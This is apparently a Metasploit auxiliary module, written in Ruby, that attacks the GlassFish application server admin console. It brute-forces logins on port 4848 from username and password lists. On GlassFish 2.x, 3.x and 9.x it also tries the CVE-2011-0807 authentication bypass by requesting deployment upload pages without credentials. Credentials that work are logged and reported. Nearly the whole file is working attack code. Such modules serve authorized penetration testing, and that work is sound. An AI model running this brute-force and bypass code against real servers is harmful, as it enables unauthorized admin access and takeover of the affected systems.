##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'GlassFish Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to GlassFish instance using username and password
        combindations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
        It will also try to do an authentication bypass against older versions of GlassFish.
        Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
        to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
      },
      'Author'         =>
        [
          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2011-0807'],
          ['OSVDB', '71948'],
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        # Option SSL and SSLVersion are moved from advanced to regular because some Glassfish
        # setups require HTTPS by default. If that's the case, the user will have to manually
        # configure them.
        Opt::RPORT(4848),
        OptString.new('TARGETURI', [true, 'The URI path of the GlassFish Server', '/']),
        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
        OptBool.new('SSL', [false, 'Negotiate SSL for outgoing connections', false]),
        OptBool.new('IGNOREVERSION', [false, 'Ignore version check and brute-force anyway', false]),
        OptEnum.new('SSLVersion', [false, 'Specify the version of SSL that should be used', 'SSL3', ['SSL2', 'SSL3', 'TLS1']])
      ], self.class)
  end

  #
  # Override all the print_* methods we're using, because I don't feel like checking every line
  # to modify the prefix.
  #

  def prefix
    "#{rhost}:#{rport} Glassfish - "
  end

  def print_status(msg='')
    super("#{prefix} #{msg}")
  end

  def vprint_status(msg='')
    super("#{msg}") if datastore['VERBOSE']
  end

  def print_good(msg='')
    super("#{prefix} #{msg}")
  end

  def print_error(msg='')
    super("#{prefix} #{msg}")
  end

  def print_warning(msg='')
    super("#{prefix} #{msg}")
  end

  #
  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x, 4.0) and
  # banner (ex: Sun Java System Application Server 9.x)
  #
  def get_version(res)
    # Extract banner from response
    banner = res.headers['Server'] || ''

    # Default value for edition and glassfish version
    edition = 'Commercial'
    version = 'Unknown'

    # Set edition (Open Source or Commercial)
    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/
    edition = 'Open Source' if banner =~ p

    # Set version.  Some GlassFish servers return banner "GlassFish v3".
    if banner =~ /(GlassFish Server|Open Source Edition)[[:blank:]]*(\d\.\d)/
      version = $2
    elsif banner =~ /GlassFish v(\d)/ and version.nil?
      version = $1
    elsif banner =~ /Sun GlassFish Enterprise Server v2/ and version.nil?
      version = '2.x'
    elsif banner =~ /Sun Java System Application Server 9/ and version.nil?
      version = '9.x'
    end

    return edition, version, banner
  end


  #
  # Only tries to brute-force on tested versions
  #
  def version_tested?(version)
    return (version =~ /^[12349]\./) ? true : false
  end


  #
  # Prints a successful login message, and reports it to database
  #
  def log_success(user='',pass='')
    if user.empty? and pass.empty?
      print_good('SUCCESSFUL authentication bypass')
    else
      print_good("SUCCESSFUL login for '#{user}' : '#{pass}'")
    end

    report_auth_info(
      :host   => rhost,
      :port   => rport,
      :sname => (ssl ? 'https' : 'http'),
      :user   => user,
      :pass   => pass,
      :proof  => "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
      :source_type => "user_supplied",
      :active => true
    )
  end


  #
  # Returns the last JSESSION
  #
  def jsession
    @jsession || ''
  end


  #
  # Sets the JSESSION id
  #
  def set_jsession(res)
    if res and res.get_cookies =~ /JSESSIONID=(\w*);/i
      @jsession = $1
    end
  end


  #
  # Send GET or POST request, and return the response
  #
  def send_request(path, method, data=nil, ctype=nil)
    headers = {}
    headers['Cookie'] = "JSESSIONID=#{jsession}" unless jsession.blank?
    headers['Content-Type'] = ctype unless ctype.blank?
    headers['Content-Length'] = data.length unless data.blank?

    uri = normalize_uri(target_uri.path)
    res = send_request_raw({
      'uri'	  => "#{uri}#{path}",
      'method'  => method,
      'data'	  => data,
      'headers' => headers,
    }, 90)

    set_jsession(res)

    res
  end


  #
  # Try to login to Glassfish with a credential, and return the response
  #
  def try_login(user, pass)
    data  = "j_username=#{Rex::Text.uri_encode(user.to_s)}&"
    data << "j_password=#{Rex::Text.uri_encode(pass.to_s)}&"
    data << 'loginButton=Login'

    send_request('/j_security_check', 'POST', data, 'application/x-www-form-urlencoded')
  end


  #
  # Tries to bypass auth
  #
  def try_glassfish_auth_bypass(version)
    print_status('Trying GlassFish authentication bypass..')
    success = false

    if version =~ /^[29]\.x$/
      res = send_request('/applications/upload.jsf', 'get')
      p = /<title>Deploy Enterprise Applications\/Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    elsif version =~ /^3\./
      res = send_request('/common/applications/uploadFrame.jsf', 'get')
      p = /<title>Deploy Applications or Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    end

    if success
      log_success
    else
      print_error('Failed authentication bypass')
    end

    success
  end


  #
  # Newer editions of Glassfish prevents remote brute-forcing by disabling remote logins..
  # So we need to check this first before actually trying anything.
  #
  def is_secure_admin_disabled?(res)
    return (res.body =~ /Secure Admin must be enabled/) ? true : false
  end


  #
  # Login routine specific to Glfassfish 2 and 9
  #
  def try_glassfish_2(user, pass)
    res = try_login(user,pass)
    if res and res.code == 302
      set_jsession(res)
      res = send_request('/applications/upload.jsf', 'GET')

      p = /<title>Deploy Enterprise Applications\/Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        return true
      end
    end

    false
  end


  #
  # Login routine specific to Glassfish 3 and 4
  #
  def try_glassfish_3(user, pass)
    res = try_login(user,pass, )
    if res and res.code == 302
      set_jsession(res)
      res = send_request('/common/applications/uploadFrame.jsf', 'GET')
      p = /<title>Deploy Applications or Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        return true
      end
    end

    false
  end


  #
  # Tries to login to Glassfish depending on the version
  #
  def try_glassfish_login(version,user,pass)
    vprint_status("Trying credential GlassFish #{version} '#{user}' : '#{pass}'....")

    success = false

    case version
    when /^[29]\.x$/
      success = try_glassfish_2(user, pass)
    when /^[34]\./
      success = try_glassfish_3(user, pass)
    end

    if success
      log_success(user,pass)
    else
      print_error("Failed to authenticate login for '#{user}' : '#{pass}'")
    end

    success
  end


  #
  # Checks if server wants to redirect us to HTTPS
  #
  def has_https?(res)
    return (res.headers['Location'] =~ /^https:\/\//) ? true : false
  end


  #
  # main
  #
  def run_host(ip)
    # Invoke index to gather some info
    res = send_request('/common/index.jsf', 'GET')

    # Abort if res returns nil due to an exception (broken pipe or timeout)
    if res.nil?
      print_error('Unable to get a response from the server.')
      return
    end

    if res and has_https?(res)
      fail_with(Failure::BadConfig, 'HTTPS redirection detected. Please set SSL and SSLVersion.')
    elsif res and res.code.to_i == 302
      res = send_request('/login.jsf', 'GET')
    end

    # Get GlassFish version
    edition, version, banner = get_version(res)

    if datastore['IGNOREVERSION'] == false and version_tested?(version) == false
      print_warning("Untested version: #{banner}. If you prefer to continue, set IGNOREVERSION to true")
      return
    end

    print_status('Attempting authentication')

    if version =~ /^[239]\.x$/
      try_glassfish_auth_bypass(version)
    end

    each_user_pass do |user, pass|
      try_glassfish_login(version, user, pass)
    end
  end

end
